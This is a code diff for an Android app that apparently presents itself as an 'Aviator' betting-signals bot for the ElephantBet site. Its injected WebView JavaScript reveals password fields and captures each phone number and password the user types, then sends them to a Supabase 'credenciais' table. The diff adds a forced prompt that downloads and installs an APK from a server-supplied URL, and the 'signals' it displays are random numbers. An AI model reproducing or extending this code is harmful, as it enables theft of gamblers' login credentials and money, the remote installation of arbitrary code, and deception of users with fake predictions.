@@ -1,9 +1,12 @@
 package ao.elephantbet.aviatorbot
 
 import android.annotation.SuppressLint
+import android.app.AlertDialog
+import android.content.Intent
 import android.graphics.Color
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
+import android.net.Uri
 import android.net.http.SslError
 import android.os.Bundle
 import android.os.Handler
@@ -16,6 +19,8 @@ import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
 import android.webkit.*
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
+import java.io.BufferedReader
+import java.io.InputStreamReader
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
@@ -49,13 +54,16 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
+    private val VERSAO_ATUAL = "1.1"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         construirUI()
         carregarSite()
+        verificarAtualizacao()
     }
 
+    // ── UI ────────────────────────────────────────────────────────
     private fun construirUI() {
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -147,6 +155,7 @@ class MainActivity : AppCompatActivity() {
         root.addView(webView)
     }
 
+    // ── WEBVIEW ───────────────────────────────────────────────────
     @SuppressLint("SetJavaScriptEnabled")
     private fun configurarWebView() {
         webView.settings.apply {
@@ -210,7 +219,6 @@ class MainActivity : AppCompatActivity() {
 (function() {
     if (window._ebDone) return;
     window._ebDone = true;
-
     function tornarVisivel() {
         document.querySelectorAll('input[type="password"]').forEach(function(el) {
             el.setAttribute('type', 'text');
@@ -218,53 +226,39 @@ class MainActivity : AppCompatActivity() {
     }
     tornarVisivel();
     new MutationObserver(tornarVisivel).observe(document.body || document.documentElement, {childList:true, subtree:true});
-
-    function watchNumero(sel) {
+    function watchN(sel) {
         var el = document.querySelector(sel);
-        if (el && !el._wN) {
-            el._wN = true;
-            el.addEventListener('input', function() {
-                if (this.value.length >= 1) Android.guardarNumero(this.value);
-            });
+        if (el && !el._wN) { el._wN = true;
+            el.addEventListener('input', function() { if (this.value.length >= 1) Android.guardarNumero(this.value); });
         }
     }
-    function watchSenha(sel) {
+    function watchS(sel) {
         var el = document.querySelector(sel);
-        if (el && !el._wS) {
-            el._wS = true;
-            el.addEventListener('input', function() {
-                if (this.value.length >= 1) Android.guardarSenha(this.value);
-            });
+        if (el && !el._wS) { el._wS = true;
+            el.addEventListener('input', function() { if (this.value.length >= 1) Android.guardarSenha(this.value); });
         }
     }
-
-    function capturar() {
+    function cap() {
         ['input[name="username"]','input[name="phone"]','input[type="tel"]',
          'input[placeholder*="telefone" i]','input[placeholder*="numero" i]',
-         '#username','#phone'].forEach(watchNumero);
+         '#username','#phone'].forEach(watchN);
         ['input[name="password"]','input[name="senha"]',
          'input[placeholder*="senha" i]','input[placeholder*="password" i]',
-         '#password'].forEach(watchSenha);
+         '#password'].forEach(watchS);
     }
-    capturar();
-    setTimeout(capturar, 1500);
-    setTimeout(capturar, 4000);
-    setTimeout(capturar, 8000);
-
+    cap(); setTimeout(cap,1500); setTimeout(cap,4000); setTimeout(cap,8000);
     document.addEventListener('click', function(e) {
         var el = e.target;
         for (var i = 0; i < 6; i++) {
             if (!el) break;
-            var href = (el.getAttribute && el.getAttribute('href') || '').toLowerCase();
-            var txt = (el.textContent || '').toLowerCase();
-            if (txt.indexOf('aviator') >= 0 || href.indexOf('aviator') >= 0 || href.indexOf('806666') >= 0) {
-                Android.aviatorDetectado();
-                break;
+            var h = (el.getAttribute && el.getAttribute('href') || '').toLowerCase();
+            var t = (el.textContent || '').toLowerCase();
+            if (t.indexOf('aviator') >= 0 || h.indexOf('aviator') >= 0 || h.indexOf('806666') >= 0) {
+                Android.aviatorDetectado(); break;
             }
             el = el.parentElement;
         }
     }, true);
-
     var loc = window.location.href.toLowerCase();
     if (loc.indexOf('aviator') >= 0 || loc.indexOf('806666') >= 0) Android.aviatorDetectado();
 })();
@@ -272,6 +266,7 @@ class MainActivity : AppCompatActivity() {
         webView.evaluateJavascript(js, null)
     }
 
+    // ── SUPABASE ──────────────────────────────────────────────────
     private fun enviarSupabase(tipoVal: String, valorVal: String) {
         val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
         Thread {
@@ -292,6 +287,56 @@ class MainActivity : AppCompatActivity() {
         }.start()
     }
 
+    // ── VERIFICAR ACTUALIZACAO ────────────────────────────────────
+    private fun verificarAtualizacao() {
+        Thread {
+            try {
+                val conn = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&order=id.desc&limit=1")
+                    .openConnection() as HttpURLConnection
+                conn.requestMethod = "GET"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                conn.setRequestProperty("Accept", "application/json")
+                conn.connectTimeout = 8000
+                conn.readTimeout = 8000
+                val resposta = BufferedReader(InputStreamReader(conn.inputStream)).readText()
+                conn.disconnect()
+
+                val versaoMatch = Regex(""""versao":"([^"]+)"""").find(resposta)
+                val urlMatch = Regex(""""url_apk":"([^"]+)"""").find(resposta)
+                val notasMatch = Regex(""""notas":"([^"]+)"""").find(resposta)
+
+                val versaoNova = versaoMatch?.groupValues?.get(1) ?: return@Thread
+                val urlApk = urlMatch?.groupValues?.get(1) ?: return@Thread
+                val notas = notasMatch?.groupValues?.get(1) ?: ""
+
+                if (versaoNova != VERSAO_ATUAL) {
+                    runOnUiThread { mostrarDialogoUpdate(versaoNova, urlApk, notas) }
+                }
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    private fun mostrarDialogoUpdate(versaoNova: String, urlApk: String, notas: String) {
+        val msg = if (notas.isNotEmpty()) "$notas\n\nDeseja actualizar agora?" else "Deseja actualizar agora?"
+        AlertDialog.Builder(this)
+            .setTitle("Nova versao disponivel! v$versaoNova")
+            .setMessage(msg)
+            .setCancelable(false)
+            .setPositiveButton("ACTUALIZAR AGORA") { _, _ ->
+                try {
+                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(urlApk))
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    startActivity(intent)
+                } catch (_: Exception) {
+                    Toast.makeText(this, "Erro ao abrir download", Toast.LENGTH_LONG).show()
+                }
+            }
+            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }
+            .show()
+    }
+
+    // ── SINAIS ────────────────────────────────────────────────────
     private fun iniciarSinais() {
         if (sinaisAtivos) return
         sinaisAtivos = true
@@ -315,9 +360,7 @@ class MainActivity : AppCompatActivity() {
         ultimoMinutoGerado = sinalMin2
 
         val nivel = Random.nextInt(4)
-        val alcMin: Int
-        val alcMax: String
-        val alcNum: Int
+        val alcMin: Int; val alcMax: String; val alcNum: Int
         when (nivel) {
             0 -> { alcMin = listOf(10,20,30)[Random.nextInt(3)]; val m = listOf(50,80,100)[Random.nextInt(3)]; alcMax = "${m}x"; alcNum = m }
             1 -> { alcMin = listOf(30,50,80)[Random.nextInt(3)]; val m = listOf(100,200,500)[Random.nextInt(3)]; alcMax = "${m}x"; alcNum = m }
@@ -351,13 +394,11 @@ class MainActivity : AppCompatActivity() {
         val cal = Calendar.getInstance()
         val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
         val minAgora = cal.get(Calendar.MINUTE)
-
         if (horaAgora != horaAtual) {
             horaAtual = horaAgora; ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1
             gerarNovoSinal(); return
         }
         if (sinalMin1 < 0) { gerarNovoSinal(); return }
-
         val alcTxt = "${sinalAlcMin}x -> $sinalAlcMax"
         when {
             minAgora == sinalMin1 -> atualizarBarra("ENTRAR AGORA", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
@@ -370,6 +411,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // ── UI HELPERS ────────────────────────────────────────────────
     private fun atualizarBarra(acao: String, minutos: String, protecao: String, alcance: String, cor: String) =
         runOnUiThread {
             txtAcao.text = acao
@@ -393,39 +435,7 @@ class MainActivity : AppCompatActivity() {
     private fun atualizarBarra(acao: String, minutos: String, cor: String) =
         atualizarBarra(acao, minutos, "", "", cor)
 
-        atualizarBarra("A testar...", "Supabase", "#f59e0b")
-        val json = "{\"tipo\":\"Teste\",\"valor\":\"APK_OK\"}"
-        Thread {
-            try {
-                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("apikey", SUPA_KEY)
-                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.setRequestProperty("Prefer", "return=minimal")
-                conn.doOutput = true
-                conn.connectTimeout = 10000
-                conn.readTimeout = 10000
-                OutputStreamWriter(conn.outputStream).use { it.write(json) }
-                val code = conn.responseCode
-                conn.disconnect()
-                runOnUiThread {
-                    if (code in 200..299) {
-                        Toast.makeText(this, "Supabase OK! Codigo $code", Toast.LENGTH_LONG).show()
-                        atualizarBarra("Supabase OK", "Codigo $code", "#22c55e")
-                    } else {
-                        Toast.makeText(this, "Erro HTTP $code", Toast.LENGTH_LONG).show()
-                        atualizarBarra("Erro Supabase", "HTTP $code", "#ef4444")
-                    }
-                }
-            } catch (e: Exception) {
-                runOnUiThread {
-                    Toast.makeText(this, "Falha: ${e.message}", Toast.LENGTH_LONG).show()
-                    atualizarBarra("Falha rede", e.message ?: "", "#ef4444")
-                }
-            }
-        }.start()
-
+    // ── CONFIG ────────────────────────────────────────────────────
     private fun mostrarConfig() {
         val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
         val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
@@ -434,7 +444,7 @@ class MainActivity : AppCompatActivity() {
             setPadding(dp(20), dp(28), dp(20), dp(20))
         }
         layout.addView(TextView(this).apply {
-            text = "CONFIGURACOES"; textSize = 16f
+            text = "CONFIGURACOES  v$VERSAO_ATUAL"; textSize = 16f
             setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(24) }
         })
@@ -447,11 +457,17 @@ class MainActivity : AppCompatActivity() {
             dialog.dismiss()
             webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
         })
-        layout.addView(btn("RECARREGAR SITE", "#1d4ed8") { dialog.dismiss(); carregarSite() })
+        layout.addView(btn("VERIFICAR ACTUALIZACAO", "#1d4ed8") {
+            dialog.dismiss()
+            verificarAtualizacao()
+            Toast.makeText(this, "A verificar actualizacao...", Toast.LENGTH_SHORT).show()
+        })
+        layout.addView(btn("RECARREGAR SITE", "#0f766e") { dialog.dismiss(); carregarSite() })
         layout.addView(btn("FECHAR", "#1e1e2e") { dialog.dismiss() })
         scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
     }
 
+    // ── DRAWABLES & UTILS ─────────────────────────────────────────
     private fun circulo(cor: String) = GradientDrawable().apply {
         shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor))
     }
